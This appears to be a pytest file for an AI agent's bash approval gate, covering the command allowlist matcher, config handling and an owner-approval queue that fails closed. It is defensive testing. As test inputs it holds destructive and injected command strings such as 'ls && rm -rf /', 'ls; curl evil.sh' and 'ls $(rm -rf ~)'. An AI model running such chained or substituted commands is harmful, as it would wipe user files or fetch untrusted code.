"""Bash approval gate: allowlist matcher, config plumbing, and the blocking
kernel gate (stage → owner decision → tool outcome)."""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest
import yaml

from boot import bash_gate, cmd_allowlist, config, paths


# --- allowlist matcher ------------------------------------------------------


def test_prefix_rule_matches_prefix() -> None:
    assert cmd_allowlist.command_allowed("git status -sb", ["git status"])
    assert not cmd_allowlist.command_allowed("git push origin", ["git status"])


def test_first_token_rule_covers_any_args() -> None:
    assert cmd_allowlist.command_allowed("rg -n foo src/", ["rg"])


def test_compound_requires_every_segment_to_match() -> None:
    assert not cmd_allowlist.command_allowed("ls && rm -rf /", ["ls"])
    assert cmd_allowlist.command_allowed("ls | wc -l", ["ls", "wc"])
    assert not cmd_allowlist.command_allowed("ls; curl evil.sh", ["ls"])


def test_substitution_never_matches() -> None:
    assert not cmd_allowlist.command_allowed("ls $(rm -rf ~)", ["ls"])
    assert not cmd_allowlist.command_allowed("echo `whoami`", ["echo"])
    assert not cmd_allowlist.command_allowed("diff <(ls a) <(ls b)", ["diff"])


def test_redirect_ampersand_is_not_a_separator() -> None:
    assert cmd_allowlist.command_allowed("make test 2>&1", ["make"])


def test_background_ampersand_is_a_separator() -> None:
    assert not cmd_allowlist.command_allowed("sleep 5 & rm -rf /", ["sleep"])


def test_quoted_separators_stay_in_their_segment() -> None:
    assert cmd_allowlist.command_allowed('echo "a && b; c"', ["echo"])


def test_subshells_and_groups_never_match() -> None:
    assert not cmd_allowlist.command_allowed("(cd /tmp && ls)", ["cd", "ls"])
    assert not cmd_allowlist.command_allowed("{ ls; }", ["ls"])


def test_unclosed_quote_never_matches() -> None:
    assert not cmd_allowlist.command_allowed("echo 'oops", ["echo"])


def test_empty_command_or_rules_never_match() -> None:
    assert not cmd_allowlist.command_allowed("ls", [])
    assert not cmd_allowlist.command_allowed("", ["ls"])
    assert not cmd_allowlist.command_allowed("   ", ["ls"])


# --- config plumbing --------------------------------------------------------


@pytest.fixture
def cfg(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    p = tmp_path / "etc" / "config.yaml"
    p.parent.mkdir(parents=True)
    p.write_text("pais: []\n")
    monkeypatch.setattr(config, "CONFIG_PATH", p, raising=True)
    return p


def _set_mode(cfg: Path, mode: str) -> None:
    data = yaml.safe_load(cfg.read_text()) or {}
    data["capabilities"] = {"bash_exec": mode}
    cfg.write_text(yaml.safe_dump(data))


def test_bash_exec_defaults_to_yes(cfg: Path) -> None:
    assert config.capability_modes()["bash_exec"] == "yes"


def test_bash_exec_projects_no_freeze_file(cfg: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(paths, "PAI_ROOT", tmp_path / "pai", raising=True)
    _set_mode(cfg, "no")
    config.project_capabilities()  # must not raise on the driver-less spec


def test_bash_allowlist_roundtrip_and_dedupe(cfg: Path) -> None:
    assert config.bash_allowlist() == []
    config.set_bash_allowlist(["git status", "rg", "git status"])
    assert config.bash_allowlist() == ["git status", "rg"]
    config.set_bash_allowlist([])
    assert config.bash_allowlist() == []
    assert "bash_allowlist" not in (yaml.safe_load(cfg.read_text()) or {})


def test_set_bash_allowlist_rejects_blank_rules(cfg: Path) -> None:
    with pytest.raises(ValueError):
        config.set_bash_allowlist(["  "])


# --- the gate ---------------------------------------------------------------


@pytest.fixture
def gate_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, cfg: Path) -> Path:
    root = tmp_path / "pai"
    monkeypatch.setattr(paths, "PAI_ROOT", root, raising=True)
    monkeypatch.setattr(bash_gate, "_DECISION_TIMEOUT_S", 2, raising=True)
    # Each test runs its own asyncio.run() loop; a cached observer would be
    # bound to a dead loop from a previous test.
    monkeypatch.setattr(bash_gate, "_observer", None, raising=True)
    monkeypatch.setattr(bash_gate, "_observer_loop", None, raising=True)
    return root


def test_yes_mode_passes_through(gate_env: Path) -> None:
    d = asyncio.run(bash_gate.clear("rm -rf ~/x", pai_slug="pai"))
    assert d.allowed and d.command == "rm -rf ~/x" and d.note is None


def test_no_mode_refuses(gate_env: Path, cfg: Path) -> None:
    _set_mode(cfg, "no")
    d = asyncio.run(bash_gate.clear("ls", pai_slug="pai"))
    assert not d.allowed
    assert "disabled" in (d.note or "")


def test_ask_mode_allowlisted_runs_without_staging(gate_env: Path, cfg: Path) -> None:
    _set_mode(cfg, "ask")
    config.set_bash_allowlist(["ls"])
    d = asyncio.run(bash_gate.clear("ls -la", pai_slug="pai"))
    assert d.allowed
    assert not list(paths.var_spool_approvals().glob("*.yaml"))


async def _decide_when_staged(mutate) -> Path:
    """Wait for the gate to stage its record, then apply `mutate(rec)` and
    write the decision back — the console's side of the handshake."""
    queue = paths.var_spool_approvals()
    for _ in range(200):
        recs = list(queue.glob("*.yaml"))
        if recs:
            break
        await asyncio.sleep(0.01)
    else:
        raise AssertionError("gate never staged a record")
    [path] = recs
    rec = yaml.safe_load(path.read_text())
    mutate(rec)
    bash_gate._atomic_dump(path, rec)
    return path


def test_ask_mode_blocks_until_approved_and_takes_owner_edit(gate_env: Path, cfg: Path) -> None:
    _set_mode(cfg, "ask")

    async def scenario():
        task = asyncio.ensure_future(
            bash_gate.clear("rm sensitive.txt", pai_slug="pai", tool="bash")
        )

        def approve(rec: dict) -> None:
            assert rec["channel"] == "bash"
            assert rec["status"] == "pending"
            assert rec["action"] == {"command": "rm sensitive.txt", "tool": "bash"}
            rec["status"] = "approved"
            rec["action"]["command"] = "rm -i sensitive.txt"

        await _decide_when_staged(approve)
        return await asyncio.wait_for(task, timeout=5)

    d = asyncio.run(scenario())
    assert d.allowed
    assert d.command == "rm -i sensitive.txt"
    assert "edited" in (d.note or "")


def test_ask_mode_rejection_carries_reason(gate_env: Path, cfg: Path) -> None:
    _set_mode(cfg, "ask")

    async def scenario():
        task = asyncio.ensure_future(bash_gate.clear("rm x", pai_slug="pai"))

        def reject(rec: dict) -> None:
            rec["status"] = "rejected"
            rec["error"] = "not that file"

        await _decide_when_staged(reject)
        return await asyncio.wait_for(task, timeout=5)

    d = asyncio.run(scenario())
    assert not d.allowed
    assert "rejected by owner" in (d.note or "")
    assert "not that file" in (d.note or "")


def test_ask_mode_times_out_fail_closed(gate_env: Path, cfg: Path) -> None:
    _set_mode(cfg, "ask")
    d = asyncio.run(asyncio.wait_for(bash_gate.clear("rm x", pai_slug="pai"), timeout=15))
    assert not d.allowed
    [path] = list(paths.var_spool_approvals().glob("*.yaml"))
    rec = yaml.safe_load(path.read_text())
    assert rec["status"] == "expired"


def test_sweep_stale_expires_only_pending_bash(gate_env: Path) -> None:
    queue = paths.var_spool_approvals()
    queue.mkdir(parents=True, exist_ok=True)

    def write(ident: str, **over) -> Path:
        rec = {
            "id": ident,
            "channel": "bash",
            "status": "pending",
            "created_by": "pai",
            "created_at": "2026-07-15T09:00:00",
            "action": {"command": "ls", "tool": "bash"},
        }
        rec.update(over)
        p = queue / f"{ident}.yaml"
        p.write_text(yaml.safe_dump(rec))
        return p

    stale = write("a-bash-pending")
    email = write("b-email-pending", channel="email")
    done = write("c-bash-approved", status="approved")

    assert bash_gate.sweep_stale() == 1
    assert yaml.safe_load(stale.read_text())["status"] == "expired"
    assert yaml.safe_load(email.read_text())["status"] == "pending"
    assert yaml.safe_load(done.read_text())["status"] == "approved"


def test_gate_survives_competing_watch_on_queue_dir(gate_env: Path, cfg: Path) -> None:
    """The approvals driver watches var/spool/approvals in the same process;
    macOS FSEvents allows one watch per exact path, so the gate must not
    claim that same path (and must resolve even if its watcher dies).
    Regression for the live 2026-07-15 incident: gate observer emitter died
    with 'Cannot add watch … already scheduled' and approvals hung to the
    10-minute deadline."""
    _set_mode(cfg, "ask")
    from watchdog.observers import Observer

    queue = paths.var_spool_approvals()
    queue.mkdir(parents=True, exist_ok=True)
    competitor = Observer()
    competitor.daemon = True
    competitor.schedule(type("H", (), {"dispatch": lambda self, e: None})(), str(queue), recursive=False)
    competitor.start()
    try:

        async def scenario():
            task = asyncio.ensure_future(bash_gate.clear("rm x", pai_slug="pai"))

            def approve(rec: dict) -> None:
                rec["status"] = "approved"

            await _decide_when_staged(approve)
            # Must resolve well before the decision deadline (2s backstop).
            return await asyncio.wait_for(task, timeout=5)

        d = asyncio.run(scenario())
        assert d.allowed
    finally:
        competitor.stop()


# --- web surface glue -------------------------------------------------------


def test_web_projection_and_command_override(gate_env: Path) -> None:
    from usr.libexec.web.pai_web import actions

    queue = paths.var_spool_approvals()
    queue.mkdir(parents=True, exist_ok=True)
    rec = {
        "id": "20260715-100000-rm",
        "channel": "bash",
        "status": "pending",
        "created_by": "pai",
        "created_at": "2026-07-15T10:00:00",
        "action": {"command": "rm sensitive.txt", "tool": "bash"},
        "decided_at": None,
        "decided_by": None,
        "error": None,
    }
    path = queue / "20260715-100000-rm.yaml"
    path.write_text(yaml.safe_dump(rec, sort_keys=False))

    [item] = actions.list_pending()
    assert item["channel"] == "bash"
    assert item["body"] == "rm sensitive.txt"

    actions.approve_action("20260715-100000-rm", body_override="rm -i sensitive.txt")
    saved = yaml.safe_load(path.read_text())
    assert saved["status"] == "approved"
    assert saved["action"]["command"] == "rm -i sensitive.txt"
